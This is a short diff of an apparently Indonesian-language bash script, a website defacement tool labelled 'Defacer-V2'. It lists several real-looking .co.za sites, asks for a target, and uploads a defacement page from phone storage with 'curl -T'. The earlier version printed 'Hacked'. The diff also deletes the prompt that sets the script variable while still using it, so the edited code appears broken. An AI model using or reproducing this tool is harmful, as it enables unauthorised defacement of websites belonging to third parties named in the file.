@@ -73,15 +73,13 @@ echo $white "http://techdirect.co.za"
 echo $cyan "http://thehellenic.co.za"
 echo $white "http://valdicare.co.za"
 echo
-echo $red "Eksekusi Taarget!!!"
-echo $green "╭─"$blue"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─$ "  target
+echo $white"  Masukan Target!!!!"
+echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Defacer-V2"$white
+read -p " ╰─$ " target
 echo
-echo $red "Masukan Script!!! "
-echo $green "╭─"$blue"Chemod@zrd404"$cyan" ~/Nama SC Harus(index.html)"$white
-read -p " ╰─$ "  script
 curl -T /storage/emulated/0/$script $target
-echo $red "["$yellow"Hacked"$red"]"$cyan"～～～＞"$green" $target"
+echo $cyan"     ["$green"+"$cyan"]"$red"==="$white"＞"$green"$target"
+echo
 echo
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
 read -p "[B/Q] : " back
